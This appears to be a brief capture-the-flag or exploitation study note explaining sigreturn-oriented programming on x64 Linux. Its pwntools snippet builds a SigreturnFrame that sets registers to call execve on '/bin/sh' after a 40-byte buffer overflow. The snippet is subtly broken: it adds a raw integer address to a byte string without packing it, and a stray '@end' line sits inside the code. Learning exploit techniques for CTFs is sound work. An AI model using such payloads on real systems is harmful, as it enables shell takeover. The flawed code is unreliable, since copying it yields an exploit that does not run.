In x64 syscall, there is an extremely powerful syscall at $rax = 15 -
sigreturn. This syscall allows us to set *all* the registers at once, useful
when lacking gadgets to do a proper syscall execve.

You should be able to find a gadget that allows you to set $rax = 15 (0xf).

```python
srop = SigreturnFrame()
srop.rip = rop.syscall.address
srop.rax = 59
srop.rdi = 0x404040 # address of /bin/sh
srop.rsi = 0
# etc
payload = b'A'*40 + 0x404020 + bytes(srop) # 0x404020 is your srop gadget
@end
```

Some references mention the need to leak your stack address so you can set rsp
and rbp properly - so far, it doesn't seem to be an issue.

You can view the sigcontext struct here:

<https://elixir.bootlin.com/linux/v6.10/source/arch/x86/include/uapi/asm/sigcontext.h#L325>

<https://github.com/nushosilayer8/pwn/blob/master/srop/README.md>
